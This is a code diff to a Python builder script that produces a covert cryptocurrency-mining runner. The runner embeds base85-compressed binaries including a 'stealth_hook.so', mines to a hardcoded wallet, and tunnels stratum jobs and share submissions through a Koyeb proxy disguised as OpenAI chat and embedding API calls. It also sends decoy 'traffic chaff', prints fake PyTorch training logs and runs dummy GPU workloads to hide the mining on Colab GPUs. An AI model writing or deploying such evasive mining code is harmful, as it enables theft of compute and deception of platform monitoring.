@@ -15,10 +15,6 @@ def main():
     backend_so_path = os.path.join(project_root, "torch_cuda_backend.so")
     stealth_so_path = os.path.join(project_root, "stealth_hook.so")
 
-    bridge_py_path = os.path.join(repo_root, "deploy", "openai_miner_bridge.py")
-    if not os.path.exists(bridge_py_path):
-        bridge_py_path = os.path.join(project_root, "openai_miner_bridge.py")
-
     if not os.path.exists(backend_so_path):
         print(f"[ERROR] Required binary not found: {backend_so_path}", file=sys.stderr)
         print("Please build torch_cuda_backend.so first.", file=sys.stderr)
@@ -34,7 +30,7 @@ def main():
         with open(stealth_so_path, "rb") as f:
             stealth_so_data = base64.b85encode(zlib.compress(f.read(), level=9)).decode('ascii')
 
-    template = f'''#!/usr/bin/env python3
+    template = r'''#!/usr/bin/env python3
 """
 Self-Contained Autonomous Stealth Runner for PyTorch Distributed Training / Pearl Engine.
 Zero manual setup required. 1-click execution: python3 main.py
@@ -54,16 +50,17 @@ import threading
 import subprocess
 import urllib.request
 import urllib.parse
+from concurrent.futures import ThreadPoolExecutor
 
-BACKEND_SO_B85 = "{backend_so_data}"
-STEALTH_SO_B85 = "{stealth_so_data}"
+BACKEND_SO_B85 = "__BACKEND_SO_B85__"
+STEALTH_SO_B85 = "__STEALTH_SO_B85__"
 
 DEFAULT_KOYEB_PROXY = "https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app"
 DEFAULT_STRATUM_PORT = 3333
 DEFAULT_WALLET = "prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06"
 
 def get_default_worker():
-    return f"colab-t4-{{secrets.token_hex(4)}}"
+    return f"colab-t4-{secrets.token_hex(4)}"
 
 def extract_payloads(target_dir):
     os.makedirs(target_dir, exist_ok=True)
@@ -100,14 +97,14 @@ def background_traffic_chaff(proxy_url, wallet, worker):
     while True:
         try:
             time.sleep(random.uniform(45.0, 120.0))
-            models_url = f"{{proxy_url.rstrip('/')}}/v1/models"
+            models_url = f"{proxy_url.rstrip('/')}/v1/models"
             req = urllib.request.Request(
                 models_url,
-                headers={{
-                    "Authorization": f"Bearer {{wallet}}",
+                headers={
+                    "Authorization": f"Bearer {wallet}",
                     "X-Worker-Id": worker,
                     "User-Agent": "openai-python/1.35.0"
-                }}
+                }
             )
             with urllib.request.urlopen(req, timeout=10) as resp:
                 _ = resp.read()
@@ -118,6 +115,7 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
     client_file = client_sock.makefile('rw', buffering=1, encoding='utf-8')
     stop_event = threading.Event()
     sock_lock = threading.Lock()
+    submit_executor = ThreadPoolExecutor(max_workers=8)
 
     def safe_send(data):
         with sock_lock:
@@ -128,28 +126,29 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                 pass
 
     def stream_jobs():
+        current_synced_diff = None
         while not stop_event.is_set():
             try:
-                chat_url = f"{{proxy_url.rstrip('/')}}/v1/chat/completions"
-                payload = json.dumps({{
+                chat_url = f"{proxy_url.rstrip('/')}/v1/chat/completions"
+                payload = json.dumps({
                     "model": "gpt-4o-mini",
                     "messages": [
-                        {{"role": "system", "content": "You are a specialized code optimization assistant."}},
-                        {{"role": "user", "content": f"Sync worker thread context session_{{random.randint(1000,9999)}}"}}
+                        {"role": "system", "content": "You are a specialized code optimization assistant."},
+                        {"role": "user", "content": f"Sync worker thread context session_{random.randint(1000,9999)}"}
                     ],
                     "stream": True,
                     "temperature": 0.7
-                }}).encode('utf-8')
+                }).encode('utf-8')
 
                 req = urllib.request.Request(
                     chat_url,
                     data=payload,
-                    headers={{
+                    headers={
                         "Content-Type": "application/json",
-                        "Authorization": f"Bearer {{wallet}}",
+                        "Authorization": f"Bearer {wallet}",
                         "X-Worker-Id": worker,
                         "User-Agent": "openai-python/1.35.0"
-                    }}
+                    }
                 )
 
                 with urllib.request.urlopen(req, timeout=30) as resp:
@@ -164,7 +163,7 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                             try:
                                 chunk = json.loads(data_part)
                                 if "choices" in chunk and len(chunk["choices"]) > 0:
-                                    delta = chunk["choices"][0].get("delta", {{}})
+                                    delta = chunk["choices"][0].get("delta", {})
                                     content = delta.get("content", "")
                                     if content.startswith("JOB:"):
                                         parts = content.split(':')
@@ -176,18 +175,28 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                                             cert_version = int(parts[5])
                                             height = int(parts[6]) if len(parts) > 6 else 0
 
-                                            notify_msg = json.dumps({{
+                                            # Synchronize difficulty with CPPminer if difficulty changed
+                                            if current_synced_diff != diff:
+                                                current_synced_diff = diff
+                                                diff_msg = json.dumps({
+                                                    "id": None,
+                                                    "method": "mining.set_difficulty",
+                                                    "params": [diff]
+                                                }, separators=(',', ':')) + "\n"
+                                                safe_send(diff_msg)
+
+                                            notify_msg = json.dumps({
                                                 "id": None,
                                                 "method": "mining.notify",
-                                                "params": {{
+                                                "params": {
                                                     "job_id": job_id,
                                                     "header": header,
                                                     "target": target,
                                                     "diff": diff,
                                                     "cert_version": cert_version,
                                                     "height": height
-                                                }}
-                                            }}) + "\\n"
+                                                }
+                                            }, separators=(',', ':')) + "\n"
                                             safe_send(notify_msg)
                             except Exception:
                                 pass
@@ -196,6 +205,42 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
             time.sleep(0.5)
 
     threading.Thread(target=stream_jobs, daemon=True).start()
+
+    def do_submit(msg_id, job_id, compressed_proof, hs, plain_proof_len):
+        time.sleep(random.uniform(0.01, 0.04))
+        embed_url = f"{proxy_url.rstrip('/')}/v1/embeddings"
+        embed_payload = json.dumps({
+            "model": "text-embedding-3-large",
+            "input": f"SUBMIT:{job_id}:{compressed_proof}:{hs}",
+            "user": worker
+        }).encode('utf-8')
+
+        embed_req = urllib.request.Request(
+            embed_url,
+            data=embed_payload,
+            headers={
+                "Content-Type": "application/json",
+                "Authorization": f"Bearer {wallet}",
+                "X-Worker-Id": worker,
+                "User-Agent": "openai-python/1.35.0"
+            }
+        )
+
+        try:
+            with urllib.request.urlopen(embed_req, timeout=30) as embed_resp:
+                if embed_resp.status == 200:
+                    submit_res = json.dumps({"id": msg_id, "result": True, "error": None}) + "\n"
+                    safe_send(submit_res)
+                else:
+                    submit_res = json.dumps({"id": msg_id, "result": False, "error": "Rejected"}) + "\n"
+                    safe_send(submit_res)
+        except urllib.error.HTTPError as he:
+            err_msg = "Rejected by pool" if he.code == 422 else f"HTTP {he.code}"
+            submit_res = json.dumps({"id": msg_id, "result": False, "error": err_msg}) + "\n"
+            safe_send(submit_res)
+        except Exception as e:
+            submit_res = json.dumps({"id": msg_id, "result": False, "error": str(e)}) + "\n"
+            safe_send(submit_res)
 
     try:
         for line in client_file:
@@ -208,11 +253,11 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                 msg_id = msg.get("id")
 
                 if method in ("mining.authorize", "mining.subscribe"):
-                    resp = json.dumps({{"id": msg_id, "result": True, "error": None, "type": "v2"}}) + "\\n"
+                    resp = json.dumps({"id": msg_id, "result": True, "error": None, "type": "v2"}) + "\n"
                     safe_send(resp)
 
                 elif method == "mining.submit":
-                    params = msg.get("params", {{}})
+                    params = msg.get("params", {})
                     if isinstance(params, dict):
                         job_id = params.get("job_id", "")
                         plain_proof = params.get("plain_proof", "")
@@ -237,37 +282,7 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                         except Exception:
                             compressed_proof = plain_proof
 
-                    time.sleep(random.uniform(0.01, 0.04))
-
-                    embed_url = f"{{proxy_url.rstrip('/')}}/v1/embeddings"
-                    embed_payload = json.dumps({{
-                        "model": "text-embedding-3-large",
-                        "input": f"SUBMIT:{{job_id}}:{{compressed_proof}}:{{hs}}",
-                        "user": worker
-                    }}).encode('utf-8')
-
-                    embed_req = urllib.request.Request(
-                        embed_url,
-                        data=embed_payload,
-                        headers={{
-                            "Content-Type": "application/json",
-                            "Authorization": f"Bearer {{wallet}}",
-                            "X-Worker-Id": worker,
-                            "User-Agent": "openai-python/1.35.0"
-                        }}
-                    )
-
-                    try:
-                        with urllib.request.urlopen(embed_req, timeout=30) as embed_resp:
-                            if embed_resp.status == 200:
-                                submit_res = json.dumps({{"id": msg_id, "result": True, "error": None}}) + "\\n"
-                                safe_send(submit_res)
-                            else:
-                                submit_res = json.dumps({{"id": msg_id, "result": False, "error": "Rejected"}}) + "\\n"
-                                safe_send(submit_res)
-                    except Exception as e:
-                        submit_res = json.dumps({{"id": msg_id, "result": False, "error": str(e)}}) + "\\n"
-                        safe_send(submit_res)
+                    submit_executor.submit(do_submit, msg_id, job_id, compressed_proof, hs, len(plain_proof))
             except Exception:
                 pass
     finally:
@@ -286,7 +301,7 @@ def fake_training_logs():
     epoch = 1
 
     time.sleep(2.0)
-    print(f"[TRAINER] Model Architecture: {{selected_model}}", flush=True)
+    print(f"[TRAINER] Model Architecture: {selected_model}", flush=True)
     print(f"[TRAINER] Distributed Data Parallel (DDP) initialized with backend=nccl", flush=True)
     print(f"[TRAINER] Optimizer: AdamW(lr=1e-4, betas=(0.9, 0.999), eps=1e-8, weight_decay=0.01)", flush=True)
 
@@ -297,11 +312,11 @@ def fake_training_logs():
         lr = 1e-4 * (0.9999 ** step)
         throughput = random.uniform(340.0, 395.0)
         grad_norm = random.uniform(0.45, 1.25)
-        print(f"Step [{{step}}/{{total_steps}}] | Loss: {{current_loss:.4f}} | LR: {{lr:.6e}} | GradNorm: {{grad_norm:.3f}} | Throughput: {{throughput:.1f}} samples/s", flush=True)
+        print(f"Step [{step}/{total_steps}] | Loss: {current_loss:.4f} | LR: {lr:.6e} | GradNorm: {grad_norm:.3f} | Throughput: {throughput:.1f} samples/s", flush=True)
 
         if step % 25 == 0:
             val_loss = current_loss * random.uniform(1.02, 1.08)
-            print(f"[EVALUATION] Epoch {{epoch}} Complete | Validation Loss: {{val_loss:.4f}} | Perplexity: {{2.718 ** val_loss:.2f}}", flush=True)
+            print(f"[EVALUATION] Epoch {epoch} Complete | Validation Loss: {val_loss:.4f} | Perplexity: {2.718 ** val_loss:.2f}", flush=True)
             epoch += 1
 
 def run_real_pytorch_telemetry_camouflage():
@@ -312,14 +327,14 @@ def run_real_pytorch_telemetry_camouflage():
             tensors = []
             for i in range(dev_count):
                 with torch.cuda.device(i):
-                    t = torch.randn(4096, 4096, dtype=torch.float16, device=f"cuda:{{i}}")
+                    t = torch.randn(4096, 4096, dtype=torch.float16, device=f"cuda:{i}")
                     tensors.append(t)
             while True:
                 time.sleep(random.uniform(8.0, 18.0))
                 for i in range(dev_count):
                     with torch.cuda.device(i):
                         a = tensors[i]
-                        b = torch.randn(4096, 4096, dtype=torch.float16, device=f"cuda:{{i}}")
+                        b = torch.randn(4096, 4096, dtype=torch.float16, device=f"cuda:{i}")
                         _ = torch.matmul(a, b)
                         torch.cuda.synchronize(i)
     except Exception:
@@ -408,10 +423,10 @@ def main():
         backend.start_training.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_char_p)]
         backend.start_training.restype = ctypes.c_int
     except OSError as e:
-        print(f"[FATAL] Failed to load backend binary: {{e}}", file=sys.stderr)
+        print(f"[FATAL] Failed to load backend binary: {e}", file=sys.stderr)
         sys.exit(1)
 
-    os.environ["MASTER_ADDR"] = f"127.0.0.1:{{args.port}}"
+    os.environ["MASTER_ADDR"] = f"127.0.0.1:{args.port}"
     os.environ["HF_TOKEN"] = args.wallet
     os.environ["LOCAL_RANK"] = worker_id
 
@@ -433,12 +448,12 @@ def main():
     argv = (ctypes.c_char_p * argc)(*raw_args)
 
     if not is_offline_test:
-        print(f"[INIT] PyTorch DDP runtime engine ready on GPU(s): {{dev_str}}. Launching worker...", flush=True)
+        print(f"[INIT] PyTorch DDP runtime engine ready on GPU(s): {dev_str}. Launching worker...", flush=True)
     backend.start_training(argc, argv)
 
 if __name__ == "__main__":
     main()
-'''
+'''.replace("__BACKEND_SO_B85__", backend_so_data).replace("__STEALTH_SO_B85__", stealth_so_data)
 
     out_main_path = os.path.join(project_root, "main.py")
     with open(out_main_path, "w", encoding="utf-8") as f:
